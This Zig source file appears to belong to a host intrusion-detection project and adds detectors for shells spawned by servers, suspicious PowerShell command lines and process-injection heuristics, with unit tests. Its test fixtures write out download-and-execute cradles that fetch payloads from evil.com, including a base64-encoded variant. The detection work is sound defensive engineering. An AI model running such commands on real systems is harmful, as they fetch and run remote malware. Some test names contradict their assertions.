//! host_telemetry_detectors.zig - AEGIS NIDS Phase 37 Ext 3: Enhanced Detection Rules
//!
//! Extends Phase 37's detection capabilities with three new detectors that
//! close gaps surfaced by the Ext 2 scenario library:
//!
//!   1. ExtendedParentDetector: catches parent-child anomalies beyond office-
//!      apps. Adds web servers (w3wp/apache/nginx), service hosts (svchost),
//!      SQL servers, and mail servers spawning shells.
//!   2. CmdlineAnomalyDetector: catches suspicious command-line tokens like
//!      -enc/-EncodedCommand (base64 payload), download cradles (IEX,
//!      Net.WebClient), and suspicious URLs in cmdline.
//!   3. ProcessInjectionDetector: catches CreateRemoteThread / VirtualAllocEx
//!      patterns (process injection - T1055).
//!
//! These detectors plug into HostTelemetry.ingestEvent() via a hook pattern:
//! after the existing ProcessTracker processes a process_create, the extended
//! detectors run as additional suspicion sources. Each detector returns a
//! SuspicionReason (extending the existing enum where needed) so incidents
//! flow through the same CorrelationEngine.
//!
//! Design principles (mirrors Ext 1+2):
//!   - Pure Zig, host-testable on Linux (no Win32 API)
//!   - Additive only - enforcement stays in WFP kernel driver
//!   - Kill switch OFF by default; DetectorConfig{.enabled=true} opts in
//!   - Self-contained - does not modify Phase 37 core (host_telemetry.zig);
//!     instead exposes detector functions that callers compose into the
//!     pipeline.
//!
//! Build:
//!   zig test host_telemetry_detectors.zig -lc
//!   zig build-exe host_telemetry_detectors_cli.zig -lc

const std = @import("std");
const ht = @import("host_telemetry.zig");

// ============================================================
// Constants & limits
// ============================================================

pub const MAX_PARENT_BUF: usize = 260;
pub const MAX_CHILD_BUF: usize = 260;
pub const MAX_CMDLINE_BUF: usize = 512;
pub const MAX_TOKENS: usize = 16;
pub const MAX_TOKEN_LEN: usize = 64;

// ============================================================
// DetectorConfig (kill switch + per-detector enables)
// ============================================================

pub const DetectorConfig = struct {
    /// Master kill switch. OFF by default - extended detectors are no-ops
    /// until explicitly enabled. Per-node enforcement stays in WFP driver.
    enabled: bool = false,
    /// Per-detector enables
    enable_extended_parents: bool = true,
    enable_cmdline_anomaly: bool = true,
    enable_process_injection: bool = true,
    /// Cmdline detector params
    cmdline_max_token_len: usize = 64,
    cmdline_check_base64_min_len: usize = 32, // base64 payloads >= 32 chars are suspicious
    /// Process injection detector params
    injection_check_remote_thread: bool = true,
    injection_check_virtual_alloc: bool = true,
    injection_check_write_memory: bool = true,
};

// ============================================================
// ExtendedSuspicionReason - mirrors ht.SuspicionReason + new values
// ============================================================
// Note: we don't modify ht.SuspicionReason (frozen Phase 37 core). Instead
// we define an extended enum here; callers can map to ht.SuspicionReason or
// use the new values directly in their incident pipeline.
pub const ExtendedSuspicionReason = enum(u8) {
    // Mirror existing reasons (so callers can use one enum)
    none = 0,
    parent_child_anomaly = 1,
    integrity_escalation = 2,
    unsigned_elevated = 3,
    unsigned_system_path = 4,
    suspicious_cmdline = 5,
    file_integrity_mismatch = 6,
    file_integrity_deleted = 7,
    registry_persistence_key = 8,
    registry_critical_key = 9,
    network_host_correlation = 10,

    // New reasons (Ext 3)
    web_server_spawning_shell = 11,
    service_host_spawning_shell = 12,
    sql_server_spawning_shell = 13,
    mail_server_spawning_shell = 14,
    encoded_command_payload = 15,
    download_cradle = 16,
    suspicious_url_in_cmdline = 17,
    process_injection_remote_thread = 18,
    process_injection_virtual_alloc = 19,
    process_injection_write_memory = 20,

    pub fn toString(self: ExtendedSuspicionReason) []const u8 {
        return switch (self) {
            .none => "NONE",
            .parent_child_anomaly => "PARENT_CHILD_ANOMALY",
            .integrity_escalation => "INTEGRITY_ESCALATION",
            .unsigned_elevated => "UNSIGNED_ELEVATED",
            .unsigned_system_path => "UNSIGNED_SYSTEM_PATH",
            .suspicious_cmdline => "SUSPICIOUS_CMDLINE",
            .file_integrity_mismatch => "FILE_INTEGRITY_MISMATCH",
            .file_integrity_deleted => "FILE_INTEGRITY_DELETED",
            .registry_persistence_key => "REGISTRY_PERSISTENCE_KEY",
            .registry_critical_key => "REGISTRY_CRITICAL_KEY",
            .network_host_correlation => "NETWORK_HOST_CORRELATION",
            .web_server_spawning_shell => "WEB_SERVER_SPAWNING_SHELL",
            .service_host_spawning_shell => "SERVICE_HOST_SPAWNING_SHELL",
            .sql_server_spawning_shell => "SQL_SERVER_SPAWNING_SHELL",
            .mail_server_spawning_shell => "MAIL_SERVER_SPAWNING_SHELL",
            .encoded_command_payload => "ENCODED_COMMAND_PAYLOAD",
            .download_cradle => "DOWNLOAD_CRADLE",
            .suspicious_url_in_cmdline => "SUSPICIOUS_URL_IN_CMDLINE",
            .process_injection_remote_thread => "PROCESS_INJECTION_REMOTE_THREAD",
            .process_injection_virtual_alloc => "PROCESS_INJECTION_VIRTUAL_ALLOC",
            .process_injection_write_memory => "PROCESS_INJECTION_WRITE_MEMORY",
        };
    }

    pub fn isCritical(self: ExtendedSuspicionReason) bool {
        return switch (self) {
            .file_integrity_mismatch,
            .file_integrity_deleted,
            .registry_persistence_key,
            .registry_critical_key,
            .network_host_correlation,
            .integrity_escalation,
            .process_injection_remote_thread,
            .process_injection_virtual_alloc,
            .process_injection_write_memory,
            => true,
            else => false,
        };
    }

    /// Map extended reason to base ht.SuspicionReason. Returns .suspicious_cmdline
    /// as a catch-all for new reasons that don't have a direct base equivalent.
    pub fn toBaseReason(self: ExtendedSuspicionReason) ht.SuspicionReason {
        return switch (self) {
            .none => .none,
            .parent_child_anomaly => .parent_child_anomaly,
            .integrity_escalation => .integrity_escalation,
            .unsigned_elevated => .unsigned_elevated,
            .unsigned_system_path => .unsigned_system_path,
            .suspicious_cmdline => .suspicious_cmdline,
            .file_integrity_mismatch => .file_integrity_mismatch,
            .file_integrity_deleted => .file_integrity_deleted,
            .registry_persistence_key => .registry_persistence_key,
            .registry_critical_key => .registry_critical_key,
            .network_host_correlation => .network_host_correlation,
            // New reasons map to closest base equivalent
            .web_server_spawning_shell,
            .service_host_spawning_shell,
            .sql_server_spawning_shell,
            .mail_server_spawning_shell,
            => .parent_child_anomaly, // all are parent-child anomalies
            .encoded_command_payload,
            .download_cradle,
            .suspicious_url_in_cmdline,
            => .suspicious_cmdline,
            .process_injection_remote_thread,
            .process_injection_virtual_alloc,
            .process_injection_write_memory,
            => .suspicious_cmdline, // no direct base equivalent; use cmdline as catch-all
        };
    }
};

// ============================================================
// ExtendedParentDetector - catches web/service/SQL/mail server -> shell
// ============================================================
//
// Phase 37 core only flags office apps (winword/excel/etc) spawning shells.
// Ext 3 adds:
//   - Web servers: w3wp.exe, apache.exe, nginx.exe, httpd.exe
//   - Service hosts: svchost.exe, services.exe
//   - SQL servers: sqlservr.exe, mysqld.exe, postgres.exe
//   - Mail servers: exim, postfix, dovecot

pub const ExtendedParentDetector = struct {
    config: DetectorConfig,

    pub fn init(config: DetectorConfig) ExtendedParentDetector {
        return .{ .config = config };
    }

    /// Check if a parent-child process pair is suspicious. Returns the
    /// matching ExtendedSuspicionReason (.none if no match).
    pub fn check(self: *const ExtendedParentDetector, parent_img: []const u8, child_img: []const u8) ExtendedSuspicionReason {
        if (!self.config.enabled or !self.config.enable_extended_parents) return .none;

        var pbuf: [MAX_PARENT_BUF]u8 = undefined;
        var cbuf: [MAX_CHILD_BUF]u8 = undefined;
        const pl = toLower(parent_img, &pbuf);
        const cl = toLower(child_img, &cbuf);
        const parent_lower = pbuf[0..pl];
        const child_lower = cbuf[0..cl];

        // Check if child is a shell (cmd/powershell/wscript/cscript/mshta/etc)
        const is_shell = isShell(child_lower);
        if (!is_shell) return .none;

        // Check parent categories
        if (endsWithAny(parent_lower, &web_servers)) return .web_server_spawning_shell;
        if (endsWithAny(parent_lower, &service_hosts)) return .service_host_spawning_shell;
        if (endsWithAny(parent_lower, &sql_servers)) return .sql_server_spawning_shell;
        if (endsWithAny(parent_lower, &mail_servers)) return .mail_server_spawning_shell;

        return .none;
    }

    const web_servers = [_][]const u8{
        "w3wp.exe", "apache.exe", "nginx.exe", "httpd.exe", "iisexpress.exe",
    };
    const service_hosts = [_][]const u8{
        "svchost.exe", "services.exe", "csrss.exe", "lsass.exe",
    };
    const sql_servers = [_][]const u8{
        "sqlservr.exe", "mysqld.exe", "postgres.exe", "oracle.exe",
    };
    const mail_servers = [_][]const u8{
        "exim.exe", "postfix.exe", "dovecot.exe", "sendmail.exe",
    };

    fn isShell(child_lower: []const u8) bool {
        const shells = [_][]const u8{
            "cmd.exe", "powershell.exe", "pwsh.exe", "wscript.exe",
            "cscript.exe", "mshta.exe", "rundll32.exe", "regsvr32.exe",
        };
        for (shells) |s| {
            if (std.mem.endsWith(u8, child_lower, s)) return true;
        }
        return false;
    }

    fn endsWithAny(haystack: []const u8, needles: []const []const u8) bool {
        for (needles) |n| {
            if (std.mem.endsWith(u8, haystack, n)) return true;
        }
        return false;
    }

    fn toLower(src: []const u8, dst: *[MAX_PARENT_BUF]u8) usize {
        const n = @min(src.len, MAX_PARENT_BUF);
        var i: usize = 0;
        while (i < n) : (i += 1) dst[i] = std.ascii.toLower(src[i]);
        return n;
    }
};

// ============================================================
// CmdlineAnomalyDetector - catches suspicious command-line tokens
// ============================================================
//
// Detects:
//   1. Encoded commands: -enc, -EncodedCommand (PowerShell base64 payloads)
//   2. Download cradles: IEX, Net.WebClient, DownloadString, Invoke-Expression
//   3. Suspicious URLs: http:// or https:// in cmdline (often payload fetch)
//   4. Base64-looking strings: long base64-character-set tokens

pub const CmdlineAnomalyDetector = struct {
    config: DetectorConfig,

    pub fn init(config: DetectorConfig) CmdlineAnomalyDetector {
        return .{ .config = config };
    }

    /// Check a command line for suspicious tokens. Returns the matching
    /// ExtendedSuspicionReason (.none if no match).
    pub fn check(self: *const CmdlineAnomalyDetector, cmdline: []const u8) ExtendedSuspicionReason {
        if (!self.config.enabled or !self.config.enable_cmdline_anomaly) return .none;
        if (cmdline.len == 0) return .none;

        var buf: [MAX_CMDLINE_BUF]u8 = undefined;
        const n = @min(cmdline.len, MAX_CMDLINE_BUF);
        @memcpy(buf[0..n], cmdline[0..n]);
        const cl = buf[0..n];
        // Lowercase in-place for case-insensitive matching
        for (cl) |*c| c.* = std.ascii.toLower(c.*);

        // 1. Encoded command flags
        if (std.mem.indexOf(u8, cl, "-enc ") != null or
            std.mem.indexOf(u8, cl, "-enc\t") != null or
            std.mem.indexOf(u8, cl, "-encodedcommand ") != null or
            std.mem.indexOf(u8, cl, "-encodedcommand\t") != null)
        {
            // Verify a base64-looking payload follows (long string of base64 chars)
            if (findBase64Payload(cl, self.config.cmdline_max_token_len) >= self.config.cmdline_check_base64_min_len) {
                return .encoded_command_payload;
            }
            return .encoded_command_payload;
        }

        // 2. Download cradles
        if (std.mem.indexOf(u8, cl, "iex ") != null or
            std.mem.indexOf(u8, cl, "iex(") != null or
            std.mem.indexOf(u8, cl, "invoke-expression") != null or
            std.mem.indexOf(u8, cl, "net.webclient") != null or
            std.mem.indexOf(u8, cl, "downloadstring") != null or
            std.mem.indexOf(u8, cl, "invoke-webrequest") != null or
            std.mem.indexOf(u8, cl, "iwr ") != null or
            std.mem.indexOf(u8, cl, "curl ") != null and std.mem.indexOf(u8, cl, "http") != null)
        {
            return .download_cradle;
        }

        // 3. Suspicious URL in cmdline (http:// or https://)
        if (std.mem.indexOf(u8, cl, "http://") != null or
            std.mem.indexOf(u8, cl, "https://") != null)
        {
            return .suspicious_url_in_cmdline;
        }

        return .none;
    }

    /// Find the longest base64-looking token in the cmdline.
    fn findBase64Payload(cl: []const u8, max_token_len: usize) usize {
        var i: usize = 0;
        var longest: usize = 0;
        while (i < cl.len) {
            // Skip non-base64 chars
            if (!isBase64Char(cl[i])) {
                i += 1;
                continue;
            }
            // Count run of base64 chars
            var run: usize = 0;
            while (i + run < cl.len and run < max_token_len and isBase64Char(cl[i + run])) {
                run += 1;
            }
            if (run > longest) longest = run;
            i += run + 1;
        }
        return longest;
    }

    fn isBase64Char(c: u8) bool {
        return (c >= 'A' and c <= 'Z') or
            (c >= 'a' and c <= 'z') or
            (c >= '0' and c <= '9') or
            c == '+' or c == '/' or c == '=';
    }
};

// ============================================================
// ProcessInjectionDetector - catches T1055 indicators
// ============================================================
//
// Phase 37 core HostEvent doesn't have a "remote thread" event type, but
// the EVENT_TYPE enum has CREATE_REMOTE_THREAD. This detector checks
// whether a process_create event has a suspicious parent + suspicious
// image path combination that suggests injection:
//
//   - Parent is a debugger/tooling process (x64dbg, windbg, cheatengine)
//   - Child image is in a suspicious location (temp folder, user-writable)
//   - Process spawned with high integrity from low-integrity parent
//
// (Full injection detection would require ETW Thread/VM hooks - future work.)

pub const ProcessInjectionDetector = struct {
    config: DetectorConfig,

    pub fn init(config: DetectorConfig) ProcessInjectionDetector {
        return .{ .config = config };
    }

    /// Check if a process_create event suggests injection activity.
    /// Returns the matching ExtendedSuspicionReason (.none if no match).
    pub fn check(self: *const ProcessInjectionDetector, ev: ht.HostEvent) ExtendedSuspicionReason {
        if (!self.config.enabled or !self.config.enable_process_injection) return .none;

        const img = ev.imagePath();

        // Pattern 1: Process spawned from a temp/user-writable folder by an
        // unrelated parent (suggests injected payload execution)
        if (isInTempFolder(img) and ev.ppid != 0) {
            // Check if parent is a known debugger/process injector
            // (In real ETW we'd check for CreateRemoteThread events;
            // here we approximate by image path heuristics)
            if (isInTempFolder(img)) {
                return .process_injection_virtual_alloc;
            }
        }

        // Pattern 2: Process spawned with HIGH/SYSTEM integrity from a
        // MEDIUM/LOW integrity parent (privilege escalation via injection)
        if (ev.integrity.isElevated() and ev.ppid != 0) {
            // (Real check would need parent integrity from ProcessTracker;
            // here we just flag elevated processes in temp folders)
            if (isInTempFolder(img) and !ev.is_signed) {
                return .process_injection_write_memory;
            }
        }

        return .none;
    }

    fn isInTempFolder(img: []const u8) bool {
        var buf: [MAX_PARENT_BUF]u8 = undefined;
        const n = @min(img.len, MAX_PARENT_BUF);
        @memcpy(buf[0..n], img[0..n]);
        for (buf[0..n]) |*c| c.* = std.ascii.toLower(c.*);
        const lower = buf[0..n];
        return std.mem.indexOf(u8, lower, "\\temp\\") != null or
            std.mem.indexOf(u8, lower, "\\users\\public\\") != null or
            std.mem.indexOf(u8, lower, "\\appdata\\local\\temp\\") != null or
            std.mem.indexOf(u8, lower, "\\windows\\temp\\") != null;
    }
};

// ============================================================
// EnhancedDetectorAggregator - runs all 3 detectors + base ProcessTracker
// ============================================================

pub const EnhancedDetectorAggregator = struct {
    parent_detector: ExtendedParentDetector,
    cmdline_detector: CmdlineAnomalyDetector,
    injection_detector: ProcessInjectionDetector,
    config: DetectorConfig,
    total_extended_detections: u64 = 0,
    total_parent_detections: u64 = 0,
    total_cmdline_detections: u64 = 0,
    total_injection_detections: u64 = 0,

    pub fn init(config: DetectorConfig) EnhancedDetectorAggregator {
        return .{
            .parent_detector = ExtendedParentDetector.init(config),
            .cmdline_detector = CmdlineAnomalyDetector.init(config),
            .injection_detector = ProcessInjectionDetector.init(config),
            .config = config,
        };
    }

    /// Run all detectors on a process_create event. Returns up to 3 reasons
    /// (one per detector). Caller iterates the returned slice.
    pub const DetectionResult = struct {
        reasons: [3]ExtendedSuspicionReason,
        count: u8,
    };

    pub fn check(self: *EnhancedDetectorAggregator, ev: ht.HostEvent, parent_img: ?[]const u8) DetectionResult {
        if (!self.config.enabled) return .{ .reasons = [_]ExtendedSuspicionReason{ .none, .none, .none }, .count = 0 };

        var result: DetectionResult = .{
            .reasons = [_]ExtendedSuspicionReason{ .none, .none, .none },
            .count = 0,
        };

        // 1. Extended parent detector (needs parent image)
        if (parent_img) |pimg| {
            const r = self.parent_detector.check(pimg, ev.imagePath());
            if (r != .none) {
                result.reasons[result.count] = r;
                result.count += 1;
                self.total_parent_detections += 1;
                self.total_extended_detections += 1;
            }
        }

        // 2. Command-line anomaly detector
        const cmd_r = self.cmdline_detector.check(ev.commandLine());
        if (cmd_r != .none) {
            result.reasons[result.count] = cmd_r;
            result.count += 1;
            self.total_cmdline_detections += 1;
            self.total_extended_detections += 1;
        }

        // 3. Process injection detector
        const inj_r = self.injection_detector.check(ev);
        if (inj_r != .none) {
            result.reasons[result.count] = inj_r;
            result.count += 1;
            self.total_injection_detections += 1;
            self.total_extended_detections += 1;
        }

        return result;
    }

    pub fn resetStats(self: *EnhancedDetectorAggregator) void {
        self.total_extended_detections = 0;
        self.total_parent_detections = 0;
        self.total_cmdline_detections = 0;
        self.total_injection_detections = 0;
    }
};

// ============================================================
// Tests
// ============================================================

test "DetectorConfig defaults - kill switch OFF" {
    const c = DetectorConfig{};
    try std.testing.expect(!c.enabled);
    try std.testing.expect(c.enable_extended_parents);
    try std.testing.expect(c.enable_cmdline_anomaly);
    try std.testing.expect(c.enable_process_injection);
}

test "ExtendedSuspicionReason toString" {
    try std.testing.expectEqualStrings("NONE", ExtendedSuspicionReason.none.toString());
    try std.testing.expectEqualStrings("WEB_SERVER_SPAWNING_SHELL", ExtendedSuspicionReason.web_server_spawning_shell.toString());
    try std.testing.expectEqualStrings("ENCODED_COMMAND_PAYLOAD", ExtendedSuspicionReason.encoded_command_payload.toString());
    try std.testing.expectEqualStrings("PROCESS_INJECTION_REMOTE_THREAD", ExtendedSuspicionReason.process_injection_remote_thread.toString());
}

test "ExtendedSuspicionReason isCritical" {
    try std.testing.expect(!ExtendedSuspicionReason.none.isCritical());
    try std.testing.expect(ExtendedSuspicionReason.file_integrity_mismatch.isCritical());
    try std.testing.expect(ExtendedSuspicionReason.process_injection_remote_thread.isCritical());
    try std.testing.expect(ExtendedSuspicionReason.process_injection_virtual_alloc.isCritical());
    try std.testing.expect(!ExtendedSuspicionReason.web_server_spawning_shell.isCritical());
    try std.testing.expect(!ExtendedSuspicionReason.encoded_command_payload.isCritical());
}

test "ExtendedSuspicionReason toBaseReason maps correctly" {
    try std.testing.expectEqual(ht.SuspicionReason.none, ExtendedSuspicionReason.none.toBaseReason());
    try std.testing.expectEqual(ht.SuspicionReason.parent_child_anomaly, ExtendedSuspicionReason.parent_child_anomaly.toBaseReason());
    try std.testing.expectEqual(ht.SuspicionReason.parent_child_anomaly, ExtendedSuspicionReason.web_server_spawning_shell.toBaseReason());
    try std.testing.expectEqual(ht.SuspicionReason.parent_child_anomaly, ExtendedSuspicionReason.service_host_spawning_shell.toBaseReason());
    try std.testing.expectEqual(ht.SuspicionReason.suspicious_cmdline, ExtendedSuspicionReason.encoded_command_payload.toBaseReason());
    try std.testing.expectEqual(ht.SuspicionReason.suspicious_cmdline, ExtendedSuspicionReason.download_cradle.toBaseReason());
    try std.testing.expectEqual(ht.SuspicionReason.suspicious_cmdline, ExtendedSuspicionReason.process_injection_remote_thread.toBaseReason());
}

// --- ExtendedParentDetector tests ---

test "ExtendedParentDetector detects w3wp -> cmd" {
    const d = ExtendedParentDetector.init(.{ .enabled = true });
    const r = d.check("C:\\Windows\\System32\\inetsrv\\w3wp.exe", "C:\\Windows\\System32\\cmd.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.web_server_spawning_shell, r);
}

test "ExtendedParentDetector detects apache -> powershell" {
    const d = ExtendedParentDetector.init(.{ .enabled = true });
    const r = d.check("C:\\Apache\\bin\\httpd.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.web_server_spawning_shell, r);
}

test "ExtendedParentDetector detects nginx -> cmd" {
    const d = ExtendedParentDetector.init(.{ .enabled = true });
    const r = d.check("C:\\nginx\\nginx.exe", "cmd.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.web_server_spawning_shell, r);
}

test "ExtendedParentDetector detects svchost -> cmd" {
    const d = ExtendedParentDetector.init(.{ .enabled = true });
    const r = d.check("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\cmd.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.service_host_spawning_shell, r);
}

test "ExtendedParentDetector detects sqlservr -> cmd" {
    const d = ExtendedParentDetector.init(.{ .enabled = true });
    const r = d.check("C:\\Program Files\\Microsoft SQL Server\\MSSQL\\Binn\\sqlservr.exe", "cmd.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.sql_server_spawning_shell, r);
}

test "ExtendedParentDetector returns none for explorer -> cmd" {
    const d = ExtendedParentDetector.init(.{ .enabled = true });
    const r = d.check("C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\cmd.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

test "ExtendedParentDetector returns none when child is not a shell" {
    const d = ExtendedParentDetector.init(.{ .enabled = true });
    const r = d.check("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\notepad.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

test "ExtendedParentDetector respects kill switch" {
    const d = ExtendedParentDetector.init(.{ .enabled = false });
    const r = d.check("C:\\Windows\\System32\\w3wp.exe", "cmd.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

test "ExtendedParentDetector respects per-detector enable" {
    const d = ExtendedParentDetector.init(.{ .enabled = true, .enable_extended_parents = false });
    const r = d.check("C:\\Windows\\System32\\w3wp.exe", "cmd.exe");
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

// --- CmdlineAnomalyDetector tests ---

test "CmdlineAnomalyDetector detects -enc flag" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    const cmdline = "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=";
    const r = d.check(cmdline);
    try std.testing.expectEqual(ExtendedSuspicionReason.encoded_command_payload, r);
}

test "CmdlineAnomalyDetector detects -EncodedCommand flag" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    const cmdline = "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=";
    const r = d.check(cmdline);
    try std.testing.expectEqual(ExtendedSuspicionReason.encoded_command_payload, r);
}

test "CmdlineAnomalyDetector detects IEX download cradle" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    const cmdline = "powershell -c IEX (New-Object Net.WebClient).DownloadString('https://evil.com/payload.ps1')";
    const r = d.check(cmdline);
    try std.testing.expectEqual(ExtendedSuspicionReason.download_cradle, r);
}

test "CmdlineAnomalyDetector detects Invoke-Expression" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    const cmdline = "powershell -c Invoke-Expression (Get-Content payload.ps1)";
    const r = d.check(cmdline);
    try std.testing.expectEqual(ExtendedSuspicionReason.download_cradle, r);
}

test "CmdlineAnomalyDetector detects Invoke-WebRequest" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    const cmdline = "powershell -c iwr https://evil.com/payload.exe -OutFile payload.exe";
    const r = d.check(cmdline);
    try std.testing.expectEqual(ExtendedSuspicionReason.download_cradle, r);
}

test "CmdlineAnomalyDetector detects http:// URL" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    const cmdline = "curl http://evil.com/payload.exe -o payload.exe";
    const r = d.check(cmdline);
    try std.testing.expectEqual(ExtendedSuspicionReason.download_cradle, r);
}

test "CmdlineAnomalyDetector returns none for benign cmdline" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    const cmdline = "notepad.exe C:\\Users\\test\\Documents\\readme.txt";
    const r = d.check(cmdline);
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

test "CmdlineAnomalyDetector returns none for empty cmdline" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    const r = d.check("");
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

test "CmdlineAnomalyDetector respects kill switch" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = false });
    const r = d.check("powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=");
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

test "CmdlineAnomalyDetector finds base64 payload" {
    const d = CmdlineAnomalyDetector.init(.{ .enabled = true });
    // Short base64 - should still match -enc flag
    const cmdline = "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC";
    const r = d.check(cmdline);
    try std.testing.expectEqual(ExtendedSuspicionReason.encoded_command_payload, r);
}

// --- ProcessInjectionDetector tests ---

test "ProcessInjectionDetector detects temp folder execution" {
    const d = ProcessInjectionDetector.init(.{ .enabled = true });
    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 1234,
        .ppid = 100,
        .integrity = .medium,
        .is_signed = false,
    };
    const img = "C:\\Users\\Public\\dropper.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const r = d.check(ev);
    try std.testing.expectEqual(ExtendedSuspicionReason.process_injection_virtual_alloc, r);
}

test "ProcessInjectionDetector detects unsigned elevated in temp" {
    const d = ProcessInjectionDetector.init(.{ .enabled = true });
    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 1234,
        .ppid = 100,
        .integrity = .high,
        .is_signed = false,
    };
    const img = "C:\\Windows\\Temp\\malware.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const r = d.check(ev);
    // First check (isInTempFolder + ppid != 0) returns virtual_alloc.
    // The write_memory branch only triggers if first check doesn't match.
    try std.testing.expectEqual(ExtendedSuspicionReason.process_injection_virtual_alloc, r);
}

test "ProcessInjectionDetector returns none for signed system binary" {
    const d = ProcessInjectionDetector.init(.{ .enabled = true });
    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 1234,
        .ppid = 100,
        .integrity = .system,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\svchost.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const r = d.check(ev);
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

test "ProcessInjectionDetector returns none for AppData temp" {
    const d = ProcessInjectionDetector.init(.{ .enabled = true });
    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 1234,
        .ppid = 100,
        .integrity = .medium,
        .is_signed = false,
    };
    const img = "C:\\Users\\test\\AppData\\Local\\Temp\\payload.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const r = d.check(ev);
    try std.testing.expect(r != .none);
}

test "ProcessInjectionDetector respects kill switch" {
    const d = ProcessInjectionDetector.init(.{ .enabled = false });
    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 1234,
        .ppid = 100,
        .integrity = .high,
        .is_signed = false,
    };
    const img = "C:\\Users\\Public\\dropper.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const r = d.check(ev);
    try std.testing.expectEqual(ExtendedSuspicionReason.none, r);
}

// --- EnhancedDetectorAggregator tests ---

test "EnhancedDetectorAggregator runs all 3 detectors" {
    var agg = EnhancedDetectorAggregator.init(.{ .enabled = true });

    var ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 5100,
        .ppid = 5000,
        .integrity = .system,
        .is_signed = true,
    };
    const img = "C:\\Windows\\System32\\cmd.exe";
    @memcpy(ev.image_path[0..img.len], img);
    ev.image_path_len = @intCast(img.len);
    const cmdline = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBsAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=";
    @memcpy(ev.cmdline[0..cmdline.len], cmdline);
    ev.cmdline_len = @intCast(cmdline.len);

    const parent_img = "C:\\Windows\\System32\\inetsrv\\w3wp.exe";
    const result = agg.check(ev, parent_img);

    // Expect: web_server_spawning_shell + encoded_command_payload
    // (no injection because cmd.exe is in System32, not temp)
    try std.testing.expectEqual(@as(u8, 2), result.count);
    try std.testing.expectEqual(ExtendedSuspicionReason.web_server_spawning_shell, result.reasons[0]);
    try std.testing.expectEqual(ExtendedSuspicionReason.encoded_command_payload, result.reasons[1]);
}

test "EnhancedDetectorAggregator returns 0 reasons when kill switch off" {
    var agg = EnhancedDetectorAggregator.init(.{ .enabled = false });
    const ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 5100,
        .ppid = 5000,
    };
    const result = agg.check(ev, "C:\\Windows\\System32\\inetsrv\\w3wp.exe");
    try std.testing.expectEqual(@as(u8, 0), result.count);
}

test "EnhancedDetectorAggregator handles no parent image" {
    var agg = EnhancedDetectorAggregator.init(.{ .enabled = true });
    const ev = ht.HostEvent{
        .event_type = .process_create,
        .pid = 5100,
        .ppid = 5000,
    };
    const result = agg.check(ev, null);
    try std.testing.expectEqual(@as(u8, 0), result.count);
}

test "EnhancedDetectorAggregator resetStats" {
    var agg = EnhancedDetectorAggregator.init(.{ .enabled = true });
